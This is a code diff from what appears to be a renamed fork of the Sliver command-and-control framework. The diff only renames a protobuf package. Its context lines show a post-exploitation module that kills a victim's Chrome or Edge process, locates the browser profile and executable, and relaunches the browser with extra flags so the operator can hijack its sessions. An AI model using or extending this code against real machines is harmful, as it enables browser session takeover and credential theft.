@@ -35,7 +35,7 @@ import (
 	"github.com/starkzarn/glod/client/tcpproxy"
 	"github.com/starkzarn/glod/protobuf/clientpb"
 	"github.com/starkzarn/glod/protobuf/commonpb"
-	"github.com/starkzarn/glod/protobuf/sliverpb"
+	"github.com/starkzarn/glod/protobuf/glodpb"
 	"github.com/desertbit/grumble"
 )
 
@@ -132,7 +132,7 @@ func avadaKedavraChrome(session *clientpb.Session, ctx *grumble.Context, con *co
 			con.PrintErrorf("User cancel\n")
 			return nil
 		}
-		terminateResp, err := con.Rpc.Terminate(context.Background(), &sliverpb.TerminateReq{
+		terminateResp, err := con.Rpc.Terminate(context.Background(), &glodpb.TerminateReq{
 			Request: con.ActiveTarget.Request(ctx),
 			Pid:     chromeProcess.GetPid(),
 		})
@@ -198,7 +198,7 @@ func startCursedChromeProcess(isEdge bool, session *clientpb.Session, ctx *grumb
 
 	// Execute the Chrome process with the extra flags
 	// TODO: PPID spoofing, etc.
-	chromeExec, err := con.Rpc.Execute(context.Background(), &sliverpb.ExecuteReq{
+	chromeExec, err := con.Rpc.Execute(context.Background(), &glodpb.ExecuteReq{
 		Request: con.ActiveTarget.Request(ctx),
 		Path:    chromeExePath,
 		Args:    args,
@@ -271,7 +271,7 @@ func findChromeUserDataDir(isEdge bool, session *clientpb.Session, ctx *grumble.
 			if isEdge {
 				userDataDir = fmt.Sprintf("%s:\\Users\\%s\\AppData\\Local\\Microsoft\\Edge\\User Data", driveLetter, username)
 			}
-			ls, err := con.Rpc.Ls(context.Background(), &sliverpb.LsReq{
+			ls, err := con.Rpc.Ls(context.Background(), &glodpb.LsReq{
 				Request: con.ActiveTarget.Request(ctx),
 				Path:    userDataDir,
 			})
@@ -289,7 +289,7 @@ func findChromeUserDataDir(isEdge bool, session *clientpb.Session, ctx *grumble.
 		if isEdge {
 			userDataDir = fmt.Sprintf("/Users/%s/Library/Application Support/Microsoft Edge", session.Username)
 		}
-		ls, err := con.Rpc.Ls(context.Background(), &sliverpb.LsReq{
+		ls, err := con.Rpc.Ls(context.Background(), &glodpb.LsReq{
 			Request: con.ActiveTarget.Request(ctx),
 			Path:    userDataDir,
 		})
@@ -336,7 +336,7 @@ func findChromeExecutablePath(isEdge bool, session *clientpb.Session, ctx *grumb
 			for _, chromePath := range chromeWindowsPaths {
 				chromeExecutablePath := strings.ReplaceAll(chromePath, "[DRIVE]", driveLetter)
 				chromeExecutablePath = strings.ReplaceAll(chromeExecutablePath, "[USERNAME]", username)
-				ls, err := con.Rpc.Ls(context.Background(), &sliverpb.LsReq{
+				ls, err := con.Rpc.Ls(context.Background(), &glodpb.LsReq{
 					Request: con.ActiveTarget.Request(ctx),
 					Path:    chromeExecutablePath,
 				})
@@ -356,7 +356,7 @@ func findChromeExecutablePath(isEdge bool, session *clientpb.Session, ctx *grumb
 		if isEdge {
 			defaultChromePath = "/Applications/Microsoft Edge.app/Contents/MacOS/Microsoft Edge"
 		}
-		ls, err := con.Rpc.Ls(context.Background(), &sliverpb.LsReq{
+		ls, err := con.Rpc.Ls(context.Background(), &glodpb.LsReq{
 			Request: con.ActiveTarget.Request(ctx),
 			Path:    defaultChromePath,
 		})
@@ -382,7 +382,7 @@ func findChromeExecutablePath(isEdge bool, session *clientpb.Session, ctx *grumb
 			}
 		}
 		for _, chromePath := range chromeLinuxPaths {
-			ls, err := con.Rpc.Ls(context.Background(), &sliverpb.LsReq{
+			ls, err := con.Rpc.Ls(context.Background(), &glodpb.LsReq{
 				Request: con.ActiveTarget.Request(ctx),
 				Path:    chromePath,
 			})
@@ -417,7 +417,7 @@ func isChromeProcess(executable string) bool {
 }
 
 func getChromeProcess(session *clientpb.Session, ctx *grumble.Context, con *console.SliverConsoleClient) (*commonpb.Process, error) {
-	ps, err := con.Rpc.Ps(context.Background(), &sliverpb.PsReq{
+	ps, err := con.Rpc.Ps(context.Background(), &glodpb.PsReq{
 		Request: con.ActiveTarget.Request(ctx),
 	})
 	if err != nil {
